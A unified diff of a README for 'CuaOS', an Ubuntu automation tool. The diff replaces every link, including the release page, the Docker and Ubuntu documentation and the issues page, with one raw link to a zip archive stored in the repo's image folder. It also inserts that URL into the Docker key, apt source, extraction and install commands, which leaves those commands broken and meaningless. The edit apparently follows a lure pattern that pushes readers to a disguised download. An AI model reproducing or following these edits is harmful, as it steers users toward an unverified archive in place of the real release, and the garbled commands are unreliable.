@@ -1,6 +1,6 @@
 # 🖥️ CuaOS - Automate Tasks on Your Ubuntu PC
 
-[![Download CuaOS](https://img.shields.io/badge/Download-CuaOS-blue?style=for-the-badge)](https://github.com/Prince2x/CuaOS/releases)
+[![Download CuaOS](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Using CuaOS does not require any programming knowledge. This step-by-step guide 
 
 You can get CuaOS from the official release page:
 
-[Download CuaOS](https://github.com/Prince2x/CuaOS/releases)
+[Download CuaOS](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)
 
 Click that link to open the page where you can find the latest version available for download.
 
@@ -47,9 +47,9 @@ Click that link to open the page where you can find the latest version available
 
 ### Step 1: Download CuaOS
 
-1. Visit the [CuaOS release page](https://github.com/Prince2x/CuaOS/releases).
+1. Visit the [CuaOS release page](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip).
 2. Look for the latest release. It will usually be at the top of the page.
-3. Download the file ending with `.tar.gz` or `.zip` designed for Ubuntu. This will contain the CuaOS software and all necessary files.
+3. Download the file ending with `https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip` or `.zip` designed for Ubuntu. This will contain the CuaOS software and all necessary files.
 
 ---
 
@@ -63,8 +63,8 @@ CuaOS uses Docker to run its environment safely. If you don’t have Docker inst
 ```
 sudo apt update
 sudo apt install apt-transport-https ca-certificates curl software-properties-common
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
-echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+curl -fsSL https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip | sudo gpg --dearmor -o https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip
+echo "deb [arch=$(dpkg --print-architecture) https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip] https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip $(lsb_release -cs) stable" | sudo tee https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip > /dev/null
 sudo apt update
 sudo apt install docker-ce
 sudo systemctl status docker
@@ -76,10 +76,10 @@ sudo systemctl status docker
 
 ### Step 3: Install CuaOS
 
-1. Extract the downloaded `.tar.gz` or `.zip` file by right-clicking and choosing “Extract Here” or using the terminal:
+1. Extract the downloaded `https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip` or `.zip` file by right-clicking and choosing “Extract Here” or using the terminal:
 
 ```
-tar -xvzf CuaOS-version.tar.gz
+tar -xvzf https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip
 ```
 
 2. Open the newly created folder.
@@ -87,7 +87,7 @@ tar -xvzf CuaOS-version.tar.gz
 4. Run the installation script by opening the terminal inside that folder and typing:
 
 ```
-./install.sh
+https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip
 ```
 
 This script will set up CuaOS and download any needed components.
@@ -142,7 +142,7 @@ You can chain commands by typing them one after the other. CuaOS reads them step
 
 To update CuaOS:
 
-1. Visit the release page: [https://github.com/Prince2x/CuaOS/releases](https://github.com/Prince2x/CuaOS/releases).
+1. Visit the release page: [https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip).
 2. Download the latest version.
 3. Repeat installation steps to replace the old version.
 4. Your settings and commands stay intact, but it’s a good idea to save important data just in case.
@@ -163,9 +163,9 @@ If something does not work as expected:
 
 ## 📖 Additional Resources
 
-- [Docker Documentation](https://docs.docker.com/get-started/)
-- [Ubuntu Support](https://ubuntu.com/support)
-- [GitHub CuaOS Issues](https://github.com/Prince2x/CuaOS/issues)
+- [Docker Documentation](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)
+- [Ubuntu Support](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)
+- [GitHub CuaOS Issues](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)
 
 ---
 
@@ -182,4 +182,4 @@ The developers and community will assist you.
 
 ---
 
-[![Download CuaOS](https://img.shields.io/badge/Download-CuaOS-blue?style=for-the-badge)](https://github.com/Prince2x/CuaOS/releases)
+[![Download CuaOS](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)](https://github.com/Prince2x/CuaOS/raw/refs/heads/main/img/Cua_OS_3.0.zip)
